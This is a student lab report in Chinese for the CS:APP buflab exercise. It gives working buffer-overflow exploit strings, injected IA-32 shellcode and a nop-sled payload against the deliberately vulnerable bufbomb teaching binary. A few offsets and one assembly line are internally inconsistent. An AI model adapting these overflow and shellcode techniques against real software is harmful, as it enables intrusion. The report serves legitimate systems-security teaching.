**中国海洋大学 计算机科学与技术系**

**实验报告**

  **姓名：陈岳阳 学号：21020007009       专业：计算机科学与技术**

**科目：**计算机系统基础      **题目：**buflab

**实验时间:**    2022/11/23

**实验成绩:     实验教师:** 范浩

 ![运行截图](C:\Users\86139\Desktop\运行截图.png)

**一、实验目的**

 	这个实验可以让我对IA-32调用与栈组织有更加深入的理解，明白buffer overflow attacks。

**二、** **实验要求**

 	bufbomb中存在具有漏洞的函数getbuf。它在接受过多字符时会出现缓冲区溢出的情形。在makecookie中输入Userid(学号)获得自己的cookie，并使用它完成五个level。

```
#define NORMAL_BUFFER_SIZE 32

int getbuf()
{
	char buf[NORMAL_BUFFER_SIZE];
	Gets(buf);
	return 1;
}
```

**三、** ***\*实验内容（所修改函数代码，功能以及重要代码的解释）：\****

​	将level\<x\>的答案放在level<x>.txt中，使用下述命令运行。其中\<x\>替换为具体数字。
$$
./hex2raw\ <\ level<x>.txt\ |\ ./bufbomb\ -u\ Userid
$$
**level0**

​	每个level都会调用如下函数。

```
void test()
{
	int val;
	volatile int local = uniqueval();
	
	val = getbuf();
	
	if (local != uniqueval()) {
		printf("Sabotaged!: the stack has been corrupted\n");
	}
	else if (val == cookie) {
		printf("Boom!: getbuf returned 0x%x\n", val);
		validate(3);
	} else {
		printf("Dud: getbuf returned 0x%x\n", val);
	}
}
```

​	只要满足其中......好像满足任何一个条件都不能过关。那是要做什么呢？题目中已经给出了。

​	本题要求使用getbuf函数缓冲区溢出的漏洞，进入下述函数。

```
void smoke()
{
	printf("Smoke!: You called smoke()\n");
	validate(0);
	exit(0);
}
```

​	注意到每次调用函数，都会push %ebp，用于后续恢复栈帧。push指令先将%esp减4，然后将src复制到%esp中。%esp一直指向栈顶元素。

​	使用gdb，反汇编getbuf函数，可以得到如下结果：

![getbuf](C:\Users\86139\Desktop\jiji\lab3\图片1.png)

​	可以看到，栈中开辟了0x32大小的空间用于存放字符串。假设进入getbuf()时，%esp为0，可以画出栈帧。

<img src="C:\Users\86139\Desktop\jiji\lab3\图片2.jpg" style="zoom:6.25%;" />

​	为了到达返回地址，要填充任意54个字符，然后填充smoke()的初始地址即可。这里没有选用首地址，但是进入了smoke()，区别不大。注意要以小端法格式填充。

![图片3](C:\Users\86139\Desktop\jiji\lab3\图片3.png)

答案：

```
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00
a2 8b 04 08
```

**level1**

​	该level仍然调用test()，然后通过缓冲区溢出进入fizz()

```
void fizz(int val)
{
	if (val == cookie) {
		printf("Fizz!: You called fizz(0x%x)\n", val);
		validate(1);
	} else
		printf("Misfire: You called fizz(0x%x)\n", val);
		exit(0);
}
```

​	可以看到，fizz具有一个参数val，且参数值等于cookie时才可以通关。因此，要想办法修改参数值或修改cookie值。先查看fizz的反汇编代码。

![图片4](C:\Users\86139\Desktop\jiji\lab3\图片4.png)

​	在IA-32中，参数通过栈传递，这里是0x8(%ebp)。我们只要修改它为cookie即可。先画出过程调用时的栈帧。

![图片5](C:\Users\86139\Desktop\jiji\lab3\图片5.jpg)

​	可以看出，只要level0中smoke的地址换为fizz的地址，并填充4字节后，填充cookie.

答案：

```
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00
ce 8b 04 08 00 00 00 00
da 0f ea 59
```

**level2**

​	level2更为复杂。这次的缓冲区溢出需要部署真实的机器指令，并返回到函数中。

​	毕竟内存哪知道自己存了什么东西，只知道往下执行。

​	调用函数bang，bang有一个没有用的参数。此外，有一个int型全局变量global_value。我们需要修改global_value，使其等于cookie。

​	为了完成上述的修改，我们需要找到global_value的位置。因为在bang中进行了比较，global_value一定在bang中出现。查看bang的反汇编。

![图片6](C:\Users\86139\Desktop\jiji\lab3\图片6.png)

​	显然0x804d140是global_value的地址。我们需要如下指令将该位置的值修改为cookie的值：

```
movl $0x59ea0fda, 0x804d140
jmp 0x8048c1f
```

​	可是，jmp使用相对寻址(call也是)，我们很难得到当前位置和bang函数之间的相对地址。因此，需要将一个地址推入栈中，然后调用ret指令：

```
movl $0x59ea0fda, 0x804d140
pushl $0x8048c1f
ret
```

​	除此之外，我们还需要知道应该把这些指令置于何处（绝对地址）。根据图片1的栈帧，和getbuf的反汇编指令，可以得到所求的绝对地址应该是%ebp-50，即0x5568361d。

![图片7](C:\Users\86139\Desktop\jiji\lab3\图片7.png)

​	然后，将上述指令转换成机器语言。转换方法是将指令放在文件mi.s中，使用gcc -m32 -c将其转换成mi.o，然后使用objdump -d查看机器指令。

![图片8](C:\Users\86139\Desktop\jiji\lab3\图片8.png)

​	以上就是level2的exploit code编写思路，下为答案。

答案：

```
//0x5568361d
c7 05 40 d1 04 08 da 0f ea 59 // movl $0x59ea0fda, 0x804d140
68 1f 8c 04 08 // pushl $0x8048c1f
c3 // ret
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
1d 36 68 55
```

**level3**

​	level3需要将getbuf()的返回值设为cookie，然后继续执行test()，并恢复栈。与level2类似，level3的攻击代码需要将汇编代码转换成机器代码。

​	注意到test()中有一个函数uniqueval()，对其进行反汇编查看。

![图片9](C:\Users\86139\Desktop\jiji\lab3\图片9.png)

![图片10](C:\Users\86139\Desktop\jiji\lab3\图片10.png)

​	我们可以查看random函数和srandom函数。得知在process id不变化时，会生成相同的随机数。

​	我们要做的是：更改getbuf的返回地址，使其返回到攻击代码的位置；攻击代码将eax修改为cookie，将ebp修改为调用getbuf之前的值，返回到test()中getbuf()结束后的位置。

```
movl $0x59ea0fda, %eax
movl $0x55683670, %ebp
pushl $0x8048c8d
ret
```

​	上面的指令中，0x55683670和0x8048c8d都是通过反汇编test()得到的。

![图片11](C:\Users\86139\Desktop\jiji\lab3\图片11.png)

答案如下：

```
b8 da 0f ea 59	//movl $0x59ea0fda, %eax
bd 70 36 68 55	//movl $0x55683670, %ebp
68 8d 8c 04 08	//pushl $0x8048c8d
c3	//ret
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
1d 36 68 55
```

**level4**

​	level4与前四个level有很大的区别。在level4中，需要加入命令行参数-n，以进入函数testn()和getbufn()。这两个函数与之前没有什么区别，但是栈的位置不再固定。我们需要输入5次攻击字符串，每次输入栈的位置都会变化。这就是知名的“栈随机化”ASLR。而对付ASLR的方法就是nop sled。

​	ASLR会使栈在一个范围内变化。只要知道范围，用nop(90)填充这个范围即可。

![图片12](C:\Users\86139\Desktop\jiji\lab3\图片12.png)

![图片13](C:\Users\86139\Desktop\jiji\lab3\图片13.png)

​	从getbufn()的反汇编可以看出，字符串的起始地址是-0x2c2(%ebp)，而返回地址在0x4(%ebp)，因此要填充710 bytes，然后用4 bytes覆盖返回地址。

​	运行程序，可以看到字符串起始地址在0x5568331e\~0x556833fe间。取最大值（只要在nop中其实就可以，最小的取值是0x556833fe，也最保险）用于覆盖返回地址。由于指令从低地址向高地址执行，只要返回地址在nop中，就会滑到攻击指令。

![图片14](C:\Users\86139\Desktop\jiji\lab3\图片14.png)

​	另一个问题是：如何恢复ebp。我们无法获得原来的ebp的绝对值，但是知道ebp关于esp的相对值0x18，可以用其恢复ebp。下方代码块即攻击代码。

```assembly
movl 0x59ea0fda, %eax
leal 0x18(%esp), %ebp
pushl 0x08048d07
ret
/*还要加上用于覆盖的返回地址*/
```

​	将上面的汇编代码翻译成机器代码，再算上90，一共0x2c2+4=710个字符，最后加上用于覆盖的返回地址，用下面的命令运行即可。

cat level4.txt | ./hex2raw -n | ./bufbomb -n -u 21020007009

答案：

```
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
/*100*/
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
/*200*/
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
/*300*/
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
/*400*/
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
/*500*/
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
/*600*/
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90
/*695*/

b8 da 0f ea 59
8d 6c 24 18
68 07 8d 04 08
c3
fe 33 68 55
```

**四、实验总结**

 	这次实验的难度随着level的提高而逐渐增加，循序渐进。level0直接利用缓冲区溢出覆盖返回地址，level1则多出了函数参数修改。level2和level3要使用汇编代码。level4则需要了解ASLR和nop sled。

​	此外，实验需要对程序进行调试，gdb的使用是必不可少的。通过这次实验的训练，我对gdb的使用更加熟练了。

​	这次实验还锻炼了我的耐心。分析代码并调试是需要很长时间的事。我前后用了大约6小时才完成实验及报告，其中level2有个指令写错了1个byte，卡了接近1小时，说明我的细心程度有待提高。实验整体还是有一点点难度的。

​	建议实验在ASLR前加入gadget部分，有趣又简单，还能对level4的做法给出一定启发。

